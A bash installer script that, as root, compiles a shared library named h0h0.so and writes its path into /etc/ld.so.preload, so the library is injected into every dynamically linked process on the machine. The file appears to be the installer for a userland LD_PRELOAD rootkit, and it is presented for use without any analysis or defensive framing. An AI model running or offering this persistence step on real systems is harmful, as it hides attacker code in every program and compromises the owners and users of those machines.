#!/bin/bash

OUTFILE="$PWD/h0h0.so"
SUCCESS='\e[1m\e[32msuccessful\e[0m.'
FAILED='\e[1m\e[31mfailed\e[0m.'

if [ "$(id -u)" != '0' ]; then
    echo 'You need to be root, ya dard.' 1>&2
    exit 1
fi

echo -e '\n\e[1m\e[31m[ Configuration ]\e[0m'
echo '\'
sed -n 's/#define/    \0/p' config.h
echo -e '/\n\n'

make

if [ -f $OUTFILE ]; then
    echo -e "[+] Writing \e[1m$OUTFILE\e[0m to \e[1m/etc/ld.so.preload\e[0m."
    echo    $OUTFILE > /etc/ld.so.preload

    echo -e "[+] Installation $SUCCESS\n";
else
    echo -e "[+] ** \e[1m$OUTFILE\e[0m not found; cannot write to \e[1m/etc/ld.so.preload\e[0m. **" 1>&2;
    echo -e "[+] Installation $FAILED\n";
fi
